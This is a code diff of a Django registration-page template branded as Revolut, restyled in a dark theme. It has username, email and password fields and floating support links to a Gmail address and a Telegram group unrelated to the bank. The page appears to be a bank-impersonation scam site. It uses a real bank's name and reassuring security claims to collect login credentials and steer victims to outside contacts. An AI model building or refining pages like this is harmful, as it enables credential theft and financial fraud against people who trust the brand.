@@ -3,143 +3,262 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Revolut - Secure Banking Login</title>
-<!-- Begin of Chaport Live Chat code -->
-<script type="text/javascript">
-(function(w,d,v3){
-w.chaportConfig = {
-  appId : '6a43a2901fd734cd86c8645d',
-};
+    <title>Revolut - Secure Registration</title>
+    <!-- Chaport Live Chat -->
+    <script type="text/javascript">
+        (function(w,d,v3){
+            w.chaportConfig = { appId: '6a43a2901fd734cd86c8645d' };
+            if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
+    </script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
-if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
-</script>
-<!-- End of Chaport Live Chat code -->    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* ============================================================
+               REVOLUT MODERN DARK UI — REGISTRATION PAGE
+               Consistent with all other pages
+               ============================================================ */
+        :root {
+            --bg-primary: #0b0b0f;
+            --bg-secondary: #14141a;
+            --bg-card: #1a1a24;
+            --bg-input: #1e1e2a;
+            --bg-input-focus: #28283a;
+            --text-primary: #f1f3f7;
+            --text-secondary: #a8b0c8;
+            --text-muted: #6a7290;
+            --border-subtle: rgba(255, 255, 255, 0.06);
+            --border-focus: rgba(255, 255, 255, 0.18);
+            --accent-blue: #2b7aff;
+            --accent-glow: rgba(43, 122, 255, 0.25);
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --error: #e74c3c;
+            --radius-sm: 8px;
+            --radius-md: 14px;
+            --radius-lg: 20px;
+            --shadow-card: 0 12px 40px rgba(0, 0, 0, 0.55);
+            --shadow-input: 0 0 0 3px rgba(43, 122, 255, 0.12);
+            --transition-fast: 0.15s ease;
+            --transition-med: 0.25s ease;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            background: #000000;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             padding: 20px;
+            -webkit-font-smoothing: antialiased;
         }
 
+        /* ====== LOGIN CONTAINER ====== */
         .login-container {
             display: flex;
-            max-width: 900px;
+            max-width: 920px;
             width: 100%;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 12px;
+            background: var(--bg-card);
+            border-radius: var(--radius-lg);
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            box-shadow: var(--shadow-card);
+            border: 1px solid var(--border-subtle);
+            position: relative;
         }
 
+        .login-container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent-blue), #6c5ce7);
+            z-index: 1;
+        }
+
+        /* ====== LEFT IMAGE SECTION ====== */
         .login-image {
             flex: 1;
-            background: linear-gradient(rgba(26, 42, 108, 0.7), rgba(42, 74, 124, 0.7)),
-                        url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80');
+            background: linear-gradient(145deg, #1a1a2e, #14141f);
             background-size: cover;
             background-position: center;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            padding: 40px;
-            color: white;
+            padding: 50px 40px;
+            color: var(--text-primary);
             text-align: center;
+            border-right: 1px solid var(--border-subtle);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-image::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -30%;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(43, 122, 255, 0.08), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .login-image::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            left: -20%;
+            width: 250px;
+            height: 250px;
+            background: radial-gradient(circle, rgba(108, 92, 231, 0.06), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
         }
 
         .login-image h2 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            font-weight: 600;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+            position: relative;
+            z-index: 2;
+            color: var(--text-primary);
         }
 
         .login-image p {
-            font-size: 16px;
+            font-size: 0.95rem;
             line-height: 1.6;
             max-width: 350px;
+            color: var(--text-secondary);
+            position: relative;
+            z-index: 2;
         }
 
+        /* ====== RIGHT FORM SECTION ====== */
         .login-form-container {
             flex: 1;
-            padding: 50px 40px;
+            padding: 44px 40px 40px;
             display: flex;
             flex-direction: column;
             justify-content: center;
+            background: var(--bg-card);
+            position: relative;
+            z-index: 2;
         }
 
         .logo {
             display: flex;
             align-items: center;
-            margin-bottom: 30px;
+            margin-bottom: 28px;
         }
 
         .logo-icon {
-            width: 50px;
-            height: 50px;
-            background: #ffffff; color: #000000;
+            width: 44px;
+            height: 44px;
+            background: var(--accent-blue);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 15px;
+            margin-right: 12px;
+            box-shadow: 0 4px 16px rgba(43, 122, 255, 0.2);
         }
 
         .logo-icon i {
-            color: white;
-            font-size: 24px;
+            color: #fff;
+            font-size: 1.2rem;
         }
 
         .logo-text {
-            font-size: 24px;
+            font-size: 1.4rem;
             font-weight: 700;
-            color: #ffffff;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text span {
+            background: linear-gradient(135deg, var(--accent-blue), #6c5ce7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
         .login-header {
-            margin-bottom: 30px;
+            margin-bottom: 28px;
         }
 
         .login-header h1 {
-            font-size: 28px;
-            color: #ffffff;
-            margin-bottom: 10px;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
         }
 
         .login-header p {
-            color: #666;
-            font-size: 16px;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
         }
 
+        /* ====== FORM ELEMENTS ====== */
         .form-group {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
         .checkbox-container {
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
-        .checkbox-container input {
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
             margin-right: 10px;
-            width: 18px;
-            height: 18px;
-            accent-color: #ffffff;
+            accent-color: var(--accent-blue);
+            cursor: pointer;
+            background: var(--bg-input);
+            border: 1px solid var(--border-subtle);
+            border-radius: 4px;
+            appearance: none;
+            -webkit-appearance: none;
+            flex-shrink: 0;
+        }
+
+        .checkbox-container input[type="checkbox"]:checked {
+            background: var(--accent-blue);
+            border-color: var(--accent-blue);
+            position: relative;
+        }
+
+        .checkbox-container input[type="checkbox"]:checked::after {
+            content: '✓';
+            color: #fff;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 11px;
+            font-weight: 700;
         }
 
         .checkbox-container label {
-            color: #333;
-            font-size: 15px;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
             font-weight: 500;
+            cursor: pointer;
         }
 
         .input-with-icon {
@@ -148,440 +267,317 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
 
         .input-with-icon i {
             position: absolute;
-            left: 15px;
+            left: 14px;
             top: 50%;
             transform: translateY(-50%);
-            color: #777;
-            z-index: 1;
+            color: var(--text-muted);
+            z-index: 2;
+            font-size: 1rem;
+            transition: color 0.3s ease;
         }
 
-        /* Style Django form inputs directly */
         .input-with-icon input {
             width: 100%;
-            padding: 15px 15px 15px 45px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: all 0.3s;
+            padding: 12px 16px 12px 44px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-subtle);
+            border-radius: var(--radius-sm);
+            font-size: 0.95rem;
+            color: var(--text-primary);
+            transition: var(--transition-fast);
+            font-family: 'Inter', sans-serif;
             position: relative;
         }
 
+        .input-with-icon input::placeholder {
+            color: var(--text-muted);
+            opacity: 0.6;
+        }
+
         .input-with-icon input:focus {
-            border-color: #ffffff;
-            box-shadow: 0 0 0 2px rgba(26, 42, 108, 0.2);
             outline: none;
+            border-color: var(--accent-blue);
+            background: var(--bg-input-focus);
+            box-shadow: var(--shadow-input);
         }
 
-        .login-button {
-            background: #ffffff; color: #000000;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 15px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
-            width: 100%;
-            margin-top: 10px;
+        .input-with-icon input:focus + i,
+        .input-with-icon input:focus ~ i {
+            color: var(--accent-blue);
         }
 
-        .login-button:hover {
-            background: #2a4a7c;
+        .input-with-icon input:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
         }
 
-        .security-note {
-            text-align: center;
-            margin: 25px 0;
-            color: #666;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .security-note i {
-            margin-right: 8px;
-            color: #ffffff;
-        }
-
-        .create-account {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 15px;
-        }
-
-        .create-account a {
-            color: #ffffff;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .create-account a:hover {
-            text-decoration: underline;
-        }
-
-        .form-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-        }
-
-        .remember-me {
-            display: flex;
-            align-items: center;
-        }
-
-        .remember-me input {
-            margin-right: 8px;
-            width: 16px;
-            height: 16px;
-            accent-color: #ffffff;
-        }
-
-        .forgot-password {
-            color: #ffffff;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-
-        /* Django form error styling */
-        .error-message {
-            background-color: #f8d7da;
-            color: #721c24;
-            padding: 10px;
-            border-radius: 4px;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-
-        .errorlist {
-            list-style: none;
-            color: #dc3545;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
+        /* ====== PASSWORD MATCH INDICATORS ====== */
         .password-match {
-            color: #28a745;
-            font-size: 14px;
-            margin-top: 5px;
+            color: var(--success);
+            font-size: 0.85rem;
+            margin-top: 4px;
             display: none;
+            font-weight: 500;
         }
 
         .password-mismatch {
-            color: #dc3545;
-            font-size: 14px;
-            margin-top: 5px;
+            color: var(--error);
+            font-size: 0.85rem;
+            margin-top: 4px;
             display: none;
+            font-weight: 500;
         }
 
-        @media (max-width: 768px) {
-            .login-container {
-                flex-direction: column;
-            }
-
-            .login-image {
-                padding: 30px 20px;
-            }
-
-            .login-form-container {
-                padding: 40px 30px;
-            }
-        }
-                .telegram-float {
-            position: fixed;
-            left: 20px;
-            bottom: 20px;
-            z-index: 1000;
-            animation: float 3s ease-in-out infinite;
+        /* ====== ERROR STYLING ====== */
+        .errorlist {
+            list-style: none;
+            color: var(--error);
+            font-size: 0.85rem;
+            margin-top: 4px;
+            font-weight: 500;
         }
 
-        .telegram-link {
+        .error-message {
+            background: rgba(231, 76, 60, 0.08);
+            color: #f5b0a0;
+            padding: 12px 16px;
+            border-radius: var(--radius-sm);
+            margin-top: 12px;
+            font-size: 0.9rem;
+            border-left: 4px solid var(--error);
+            font-weight: 500;
+        }
+
+        .error-message ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* ====== LOGIN BUTTON ====== */
+        .login-button {
+            background: linear-gradient(135deg, var(--accent-blue), #5a7cff);
+            color: #fff;
+            border: none;
+            border-radius: var(--radius-sm);
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition-med);
+            width: 100%;
+            margin-top: 6px;
+            box-shadow: 0 4px 20px rgba(43, 122, 255, 0.25);
+            font-family: 'Inter', sans-serif;
+        }
+
+        .login-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(43, 122, 255, 0.35);
+            background: linear-gradient(135deg, #3b8aff, #6a8aff);
+        }
+
+        .login-button:active {
+            transform: scale(0.98);
+        }
+
+        /* ====== SECURITY NOTE ====== */
+        .security-note {
+            text-align: center;
+            margin: 22px 0 16px;
+            color: var(--text-muted);
+            font-size: 0.85rem;
             display: flex;
             align-items: center;
             justify-content: center;
-            width: 60px;
-            height: 60px;
-            background: #0088cc;
-            border-radius: 50%;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
+            gap: 8px;
+        }
+
+        .security-note i {
+            color: var(--accent-blue);
+        }
+
+        /* ====== CREATE ACCOUNT LINK ====== */
+        .create-account {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .create-account a {
+            color: var(--accent-blue);
             text-decoration: none;
+            font-weight: 600;
+            transition: var(--transition-fast);
         }
 
-        .telegram-link:hover {
-            background: #0077b5;
-            transform: scale(1.1);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
+        .create-account a:hover {
+            color: #5a7cff;
+            text-decoration: underline;
         }
 
-        .telegram-icon {
-            width: 30px;
-            height: 30px;
-            filter: brightness(0) invert(1);
+        /* ====== FLOATING SUPPORT BUTTONS ====== */
+        .float-btn {
+            position: fixed;
+            left: 24px;
+            z-index: 1000;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            box-shadow: 0 6px 24px rgba(0, 0, 0, 0.5);
+            transition: var(--transition-med);
         }
-
-        .telegram-tooltip {
+        .float-btn:hover {
+            transform: scale(1.08) translateY(-2px);
+        }
+        .float-btn .tooltip {
             position: absolute;
-            left: 70px;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 4px;
-            font-size: 14px;
+            left: 68px;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-weight: 500;
             white-space: nowrap;
             opacity: 0;
-            transition: opacity 0.3s ease;
             pointer-events: none;
+            transition: var(--transition-med);
         }
-
-        .telegram-link:hover .telegram-tooltip {
+        .float-btn:hover .tooltip {
             opacity: 1;
         }
 
-        @keyframes float {
-            0% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-10px);
-            }
-            100% {
-                transform: translateY(0);
-            }
+        .telegram-float {
+            bottom: 100px;
+            background: #0088cc;
+        }
+        .telegram-float .telegram-icon {
+            width: 28px;
+            height: 28px;
+            filter: brightness(0) invert(1);
         }
 
-
-        @media (max-width: 768px) {
-            .telegram-float {
-                left: 10px;
-                bottom: 10px;
-            }
-
-            .telegram-link {
-                width: 50px;
-                height: 50px;
-            }
-
-            .telegram-icon {
-                width: 25px;
-                height: 25px;
-            }
-        }
-         .email-float {
-        position: fixed;
-        left: 20px;
-        bottom: 90px;
-        z-index: 1000;
-        animation: floatEmail 3s ease-in-out infinite;
-    }
-
-    .email-link {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        width: 60px;
-        height: 60px;
-        background: linear-gradient(135deg, #2A6EBB 0%, #4A90E2 100%);
-        border-radius: 50%;
-        box-shadow: 0 4px 10px rgba(42, 110, 187, 0.3);
-        transition: all 0.3s ease;
-        text-decoration: none;
-    }
-
-    .email-link:hover {
-        background: linear-gradient(135deg, #1A4A7A 0%, #2A6EBB 100%);
-        transform: scale(1.1);
-        box-shadow: 0 6px 15px rgba(42, 110, 187, 0.4);
-    }
-
-    .email-icon {
-        color: white;
-        font-size: 1.5rem;
-    }
-
-    .email-tooltip {
-        position: absolute;
-        left: 70px;
-        background: rgba(0, 0, 0, 0.8);
-        color: white;
-        padding: 8px 12px;
-        border-radius: 4px;
-        font-size: 14px;
-        white-space: nowrap;
-        opacity: 0;
-        transition: opacity 0.3s ease;
-        pointer-events: none;
-    }
-
-    .email-link:hover .email-tooltip {
-        opacity: 1;
-    }
-
-    @keyframes floatEmail {
-        0% {
-            transform: translateY(0);
-        }
-        50% {
-            transform: translateY(-8px);
-        }
-        100% {
-            transform: translateY(0);
-        }
-    }
-
-    @media (max-width: 768px) {
         .email-float {
-            left: 10px;
-            bottom: 80px;
+            bottom: 168px;
+            background: linear-gradient(135deg, #2b7aff, #5a7cff);
+        }
+        .email-float .email-icon {
+            color: #fff;
+            font-size: 1.4rem;
         }
 
-        .email-link {
-            width: 50px;
-            height: 50px;
+        /* ====== RESPONSIVE ====== */
+        @media (max-width: 768px) {
+            .login-container {
+                flex-direction: column;
+                max-width: 500px;
+            }
+
+            .login-image {
+                padding: 30px 24px;
+                border-right: none;
+                border-bottom: 1px solid var(--border-subtle);
+            }
+
+            .login-image h2 {
+                font-size: 1.4rem;
+            }
+
+            .login-form-container {
+                padding: 32px 24px 28px;
+            }
+
+            .login-header h1 {
+                font-size: 1.3rem;
+            }
+
+            .float-btn {
+                width: 48px;
+                height: 48px;
+                left: 14px;
+            }
+            .telegram-float {
+                bottom: 80px;
+            }
+            .email-float {
+                bottom: 140px;
+            }
+            .float-btn .tooltip {
+                display: none;
+            }
         }
 
-        .email-icon {
-            font-size: 1.3rem;
+        @media (max-width: 480px) {
+            .login-form-container {
+                padding: 24px 16px 20px;
+            }
+            .login-image {
+                padding: 24px 16px;
+            }
+            .login-image h2 {
+                font-size: 1.2rem;
+            }
+            .login-image p {
+                font-size: 0.85rem;
+            }
+            .login-header h1 {
+                font-size: 1.1rem;
+            }
+            .input-with-icon input {
+                font-size: 0.9rem;
+                padding: 10px 14px 10px 40px;
+            }
+            .login-button {
+                font-size: 0.9rem;
+                padding: 12px;
+            }
+            .logo-text {
+                font-size: 1.2rem;
+            }
+            .logo-icon {
+                width: 38px;
+                height: 38px;
+            }
+            .logo-icon i {
+                font-size: 1rem;
+            }
         }
-    }
-    
-        /* Sitewide Dark Mode Overrides to match Revolut Landing Page */
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-        
-        body {
-            background: #000000 !important;
-            color: #ffffff !important;
-            font-family: 'Poppins', sans-serif !important;
-        }
-        .login-container, .account-card, .balance-card, .card, .modal-content, .transaction-card, .loan-card, .investment-card {
-            background: rgba(10, 10, 10, 0.85) !important;
-            border: 1px solid rgba(255, 255, 255, 0.08) !important;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6) !important;
-            color: #ffffff !important;
-        }
-        .bank-header {
-            background: rgba(0, 0, 0, 0.85) !important;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .bank-header h1, .bank-header h1 i {
-            color: #ffffff !important;
-        }
-        .nav-toggle {
-            background: rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .nav-sidebar {
-            background: linear-gradient(180deg, #050505 0%, #111111 100%) !important;
-            border-left: 1px solid rgba(255, 255, 255, 0.08) !important;
-        }
-        .sidebar-header {
-            background: rgba(255, 255, 255, 0.03) !important;
-        }
-        .account-number-section, .payment-icon, .info-box, .detail-row {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border: 1px solid rgba(255, 255, 255, 0.08) !important;
-            color: #ffffff !important;
-        }
-        .account-number {
-            color: #ffffff !important;
-        }
-        .payment-label {
-            color: #9ca3af !important;
-        }
-        .form-control {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border: 1px solid rgba(255, 255, 255, 0.1) !important;
-            color: #ffffff !important;
-        }
-        .form-control:focus {
-            background: rgba(255, 255, 255, 0.05) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
-            color: #ffffff !important;
-            box-shadow: none !important;
-        }
-        .login-btn, .login-button, .btn-primary, .submit-btn, .btn-primary-3d, .btn-hero-primary {
-            background: #ffffff !important;
-            color: #000000 !important;
-            border: 1px solid #ffffff !important;
-        }
-        .login-btn:hover, .login-button:hover, .btn-primary:hover, .submit-btn:hover, .btn-primary-3d:hover, .btn-hero-primary:hover {
-            background: #e5e7eb !important;
-            color: #000000 !important;
-        }
-        .btn-outline-primary, .btn-secondary, .btn-outline-3d {
-            background: transparent !important;
-            color: #ffffff !important;
-            border: 1px solid rgba(255, 255, 255, 0.2) !important;
-        }
-        .btn-outline-primary:hover, .btn-secondary:hover, .btn-outline-3d:hover {
-            background: rgba(255, 255, 255, 0.08) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
-        }
-        a {
-            color: #ffffff;
-        }
-        a:hover {
-            color: #d1d5db;
-        }
-        .login-image {
-            background: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)),
-                        url('https://images.unsplash.com/photo-1601597111158-2fceff292cdc?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80') !important;
-        }
-        .security-notice {
-            background: rgba(255, 255, 255, 0.03) !important;
-            border-left: 4px solid #ffffff !important;
-            color: #9ca3af !important;
-        }
-        .security-notice i {
-            color: #ffffff !important;
-        }
-        .logo-icon {
-            background: #ffffff !important;
-        }
-        .logo-icon i {
-            color: #000000 !important;
-        }
-        .logo-text {
-            color: #ffffff !important;
-        }
-        .login-form-container {
-            background: #09090b !important;
-            color: #ffffff !important;
-        }
-
-</style>
+    </style>
 </head>
 <body>
-    <!-- Email Floating Icon -->
-<div class="email-float">
-    <a href="mailto:axiscapitaltrustbank@gmail.com" class="email-link">
-        <i class="fas fa-envelope email-icon"></i>
-        <span class="email-tooltip">Contact us via email</span>
-    </a>
-</div>
-    <!-- Telegram Floating Icon -->
-    <div class="telegram-float">
-        <a href="https://t.me/Financial_Services_Team" class="telegram-link" target="_blank">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-icon">
-            <span class="telegram-tooltip">Join our Telegram group</span>
-        </a>
-    </div>
 
+    <!-- ====== FLOATING SUPPORT BUTTONS ====== -->
+    <!-- Telegram -->
+    <a href="https://t.me/Financial_Services_Team" class="float-btn telegram-float" target="_blank" rel="noopener" aria-label="Telegram support">
+        <svg class="telegram-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.5 2.5L1.5 10.5L8.5 14.5L17.5 7.5L10.5 15.5L13.5 22.5L22.5 2.5Z" stroke="white" stroke-width="1.8" stroke-linejoin="round"/>
+            <path d="M10.5 15.5L8.5 20.5L5.5 14.5" stroke="white" stroke-width="1.8" stroke-linejoin="round"/>
+        </svg>
+        <span class="tooltip">Telegram Support</span>
+    </a>
+
+    <!-- Email -->
+    <a href="mailto:axiscapitaltrustbank@gmail.com" class="float-btn email-float" aria-label="Email support">
+        <i class="fas fa-envelope email-icon"></i>
+        <span class="tooltip">Email Support</span>
+    </a>
+
+    <!-- ====== MAIN CONTAINER ====== -->
     <div class="login-container">
+
+        <!-- Left Image / Brand Section -->
         <div class="login-image">
             <h2>Secure Banking with Revolut</h2>
-            <p>Your financial security is our top priority. Access your accounts with confidence using our encrypted login system.</p>
+            <p>Your financial security is our top priority. Access your accounts with confidence using our encrypted registration system.</p>
         </div>
 
+        <!-- Right Form Section -->
         <div class="login-form-container">
             <div class="logo">
                 <div class="logo-icon">
@@ -591,116 +587,119 @@ if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push
             </div>
 
             <div class="login-header">
-                <h1>Secure Banking Register</h1>
-                <p>Enter your credentials to access your account</p>
+                <h1>Secure Registration</h1>
+                <p>Create your account to get started</p>
             </div>
-<form method="post" class="login-form">
-    {% csrf_token %}
 
-    <!-- USERNAME -->
-    <div class="form-group">
-        <div class="checkbox-container">
-            <input type="checkbox" id="username-check" checked>
-            <label for="username-check">Enter your username</label>
+            <form method="post" class="login-form">
+                {% csrf_token %}
+
+                <!-- USERNAME -->
+                <div class="form-group">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="username-check" checked>
+                        <label for="username-check">Enter your username</label>
+                    </div>
+
+                    <div class="input-with-icon">
+                        <i class="fas fa-user"></i>
+                        {{ form.username }}
+                    </div>
+
+                    {% if form.username.errors %}
+                    <div class="errorlist">{{ form.username.errors }}</div>
+                    {% endif %}
+                </div>
+
+                <!-- EMAIL -->
+                <div class="form-group">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="email-check" checked>
+                        <label for="email-check">Enter your email</label>
+                    </div>
+
+                    <div class="input-with-icon">
+                        <i class="fas fa-envelope"></i>
+                        {{ form.email }}
+                    </div>
+
+                    {% if form.email.errors %}
+                    <div class="errorlist">{{ form.email.errors }}</div>
+                    {% endif %}
+                </div>
+
+                <!-- PASSWORD 1 -->
+                <div class="form-group">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="password1-check" checked>
+                        <label for="password1-check">Enter your password</label>
+                    </div>
+
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        {{ form.password1 }}
+                    </div>
+
+                    {% if form.password1.errors %}
+                    <div class="errorlist">{{ form.password1.errors }}</div>
+                    {% endif %}
+                </div>
+
+                <!-- PASSWORD 2 -->
+                <div class="form-group">
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="password2-check" checked>
+                        <label for="password2-check">Confirm your password</label>
+                    </div>
+
+                    <div class="input-with-icon">
+                        <i class="fas fa-lock"></i>
+                        {{ form.password2 }}
+                    </div>
+
+                    <div class="password-match">✓ Passwords match</div>
+                    <div class="password-mismatch">✗ Passwords do not match</div>
+
+                    {% if form.password2.errors %}
+                    <div class="errorlist">{{ form.password2.errors }}</div>
+                    {% endif %}
+                </div>
+
+                <!-- SUBMIT BUTTON -->
+                <button type="submit" class="login-button">Register</button>
+
+                <!-- NON-FIELD ERRORS -->
+                {% if form.non_field_errors %}
+                <div class="error-message">
+                    {{ form.non_field_errors }}
+                </div>
+                {% endif %}
+
+                <!-- SECURITY NOTE -->
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i>
+                    Your security is our priority. All data is encrypted.
+                </div>
+
+                <!-- LINK TO LOGIN -->
+                <div class="create-account">
+                    Already have an account? <a href="{% url 'loginview' %}">Sign in</a>
+                </div>
+            </form>
         </div>
-
-        <div class="input-with-icon">
-            <i class="fas fa-user"></i>
-            {{ form.username }}
-        </div>
-
-        {% if form.username.errors %}
-        <div class="errorlist">{{ form.username.errors }}</div>
-        {% endif %}
     </div>
 
-    <!-- EMAIL -->
-    <div class="form-group">
-        <div class="checkbox-container">
-            <input type="checkbox" id="email-check" checked>
-            <label for="email-check">Enter your email</label>
-        </div>
-
-        <div class="input-with-icon">
-            <i class="fas fa-envelope"></i>
-            {{ form.email }}
-        </div>
-
-        {% if form.email.errors %}
-        <div class="errorlist">{{ form.email.errors }}</div>
-        {% endif %}
-    </div>
-
-    <!-- PASSWORD 1 -->
-    <div class="form-group">
-        <div class="checkbox-container">
-            <input type="checkbox" id="password1-check" checked>
-            <label for="password1-check">Enter your password</label>
-        </div>
-
-        <div class="input-with-icon">
-            <i class="fas fa-lock"></i>
-            {{ form.password1 }}
-        </div>
-
-        {% if form.password1.errors %}
-        <div class="errorlist">{{ form.password1.errors }}</div>
-        {% endif %}
-    </div>
-
-    <!-- PASSWORD 2 -->
-    <div class="form-group">
-        <div class="checkbox-container">
-            <input type="checkbox" id="password2-check" checked>
-            <label for="password2-check">Confirm your password</label>
-        </div>
-
-        <div class="input-with-icon">
-            <i class="fas fa-lock"></i>
-            {{ form.password2 }}
-        </div>
-
-        <div class="password-match">✓ Passwords match</div>
-        <div class="password-mismatch">✗ Passwords do not match</div>
-
-        {% if form.password2.errors %}
-        <div class="errorlist">{{ form.password2.errors }}</div>
-        {% endif %}
-    </div>
-
-    <!-- SUBMIT BUTTON -->
-    <button type="submit" class="login-button">Register</button>
-
-    <!-- NON-FIELD ERRORS (e.g., email already exists) -->
-    {% if form.non_field_errors %}
-    <div class="error-message">
-        {{ form.non_field_errors }}
-    </div>
-    {% endif %}
-
-    <!-- SECURITY NOTE -->
-    <div class="security-note">
-        <i class="fas fa-shield-alt"></i>
-        Your security is our priority. All data is encrypted.
-    </div>
-
-    <!-- LINK TO LOGIN -->
-    <div class="create-account">
-        Already have an account? <a href="{% url 'loginview' %}">Sign in</a>
-    </div>
-</form>
-
-        </div>
-    </div>
-
+    <!-- ====== SCRIPTS ====== -->
     <script>
         document.addEventListener('DOMContentLoaded', function() {
